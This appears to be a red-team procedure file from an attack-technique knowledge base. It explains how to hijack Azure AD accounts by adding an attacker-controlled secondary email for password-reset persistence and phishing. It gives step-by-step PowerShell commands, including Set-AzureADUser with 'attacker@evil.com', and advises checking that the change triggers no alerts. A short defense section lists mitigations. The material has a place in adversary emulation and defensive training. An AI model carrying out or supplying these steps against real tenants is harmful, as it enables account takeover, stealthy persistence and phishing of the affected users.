---
id: 30390063-f426-4b33-8a88-a2f6c21f01fc
name: Set-Secondary-Email-for-Azure-AD-User
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:15.824351+00:00'
updated_at: '2023-04-10T20:19:27.822091+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
  - '[[Defense Evasion]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Manipulation]]'
sub_techniques:
  - '[[Additional Cloud Roles]]'
tags:
  - cloud-azure
  - dynamic-group-membership
commands:
  - '[[commands/connect-to-azure-ad]]'
  - '[[commands/get-azure-ad-user-by-upn]]'
  - '[[procedures/Set-Secondary-Email-for-Azure-AD-User]]'
platforms:
  - azure-ad
tools: []
validated: true
---

# Set-Secondary-Email-for-Azure-AD-User

## Summary

This procedure demonstrates how to modify an Azure Active Directory (Azure AD) user account by adding a secondary email address using the AzureAD PowerShell module. This can facilitate persistence by enabling password resets via the attacker's controlled email or serve as a vector for targeted phishing attacks to gain further access.

## Description

In an Azure AD environment, attackers with valid user credentials can leverage administrative or delegated permissions to alter user attributes, such as adding a secondary email (proxy address). This modification allows the attacker to intercept password reset flows or use the email for social engineering. The technique assumes initial access via compromised credentials (e.g., through phishing) and targets user accounts that may influence dynamic group memberships or resource access. Once set, the secondary email can be used to reset the user's password, potentially leading to full account takeover and lateral movement within the tenant. This aligns with scenarios where attackers maintain backdoor access without triggering immediate alerts on primary email changes.

## Requirements

1. Valid Azure AD credentials with permissions to read and update user objects (e.g., User Administrator role or equivalent).
2. AzureAD PowerShell module installed on the attacker's system.
3. PowerShell execution policy allowing script execution.
4. Network access to Azure AD endpoints (internet connectivity).

## Defense

- Enable multi-factor authentication (MFA) for all Azure AD users and monitor for changes to authentication methods.
- Implement Azure AD Privileged Identity Management (PIM) to require just-in-time access for sensitive operations like user modifications.
- Regularly audit Azure AD sign-in and audit logs for anomalous user attribute changes, such as additions to OtherMails.
- Use Azure AD Identity Protection to detect and alert on risky sign-ins or impossible travel scenarios.
- Train users to report suspicious password reset attempts and verify secondary emails during onboarding.

## Objectives

1. Modify an Azure AD user account to include a secondary email under attacker control.
2. Establish a persistence mechanism for future access via password resets.
3. Enable phishing or social engineering using the secondary email as a legitimate-looking target.

## Instructions

### Step 1: Connect to Azure AD

**Context**: Establish a connection to the Azure AD tenant using the provided credentials. This authenticates the session and grants access to user management cmdlets. If MFA is enabled, complete the verification prompt.

**Command** ([[commands/connect-to-azure-ad]]):
```powershell
Connect-AzureAD -Credential (Get-Credential)
```

> This command prompts for username and password. Upon success, it returns a confirmation message indicating the connection is established. Verify by checking the current tenant with `Get-AzureADTenantDetail`.

### Step 2: Retrieve the Target User's Object ID

**Context**: Identify the Object ID of the user to modify. This is required for the Set-AzureADUser cmdlet, as it uniquely identifies the user in Azure AD. Use the User's Principal Name (UPN) for lookup to avoid hardcoding IDs.

**Command** ([[commands/get-azure-ad-user-by-upn]]):
```powershell
Get-AzureADUser -ObjectId "user@tenant.onmicrosoft.com"
```

> Replace "user@tenant.onmicrosoft.com" with the target's UPN. Expected output includes user details like ObjectId, DisplayName, and UserPrincipalName. Copy the ObjectId value for the next step. If the user is not found, verify the UPN and permissions.

### Step 3: Set the Secondary Email Address

**Context**: Update the user's OtherMails attribute with the attacker's controlled email. This adds the email as a proxy address, allowing it to receive password reset notifications or be used in phishing lures. Confirm the change does not trigger immediate alerts in the environment.

**Command** ([[procedures/Set-Secondary-Email-for-Azure-AD-User]]):
```powershell
Set-AzureADUser -ObjectId "<OBJECT-ID>" -OtherMails @("attacker@evil.com") -Verbose
```

> Replace "<OBJECT-ID>" with the ID from Step 2 and "attacker@evil.com" with the desired secondary email. The -Verbose flag provides detailed output. Expected output confirms the update with no errors. Verify success by re-running Get-AzureADUser and checking the OtherMails property.
